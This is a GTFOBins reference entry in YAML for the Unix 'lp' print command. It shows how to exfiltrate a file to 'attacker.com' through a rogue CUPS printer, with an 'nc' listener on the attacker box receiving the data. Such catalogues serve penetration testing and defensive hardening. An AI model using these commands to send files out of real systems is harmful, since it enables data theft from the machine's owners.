<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/lp -->
---
functions:
  upload:
  - code: |-
      lp /path/to/input-file -h attacker.com
    comment: |-
      This requires `cups` to be installed. Run the following on the attacker box beforehand:

      1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
      2. `lpadmin -d printer` to set the new printer as default;
      3. `cupsctl --remote-any` to enable printing from the Internet.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver:
      code: |-
        nc -l -p 9100 >/path/to/output-file
      comment: |-
        A TCP server can be used on the attacker box to receive the data.
...
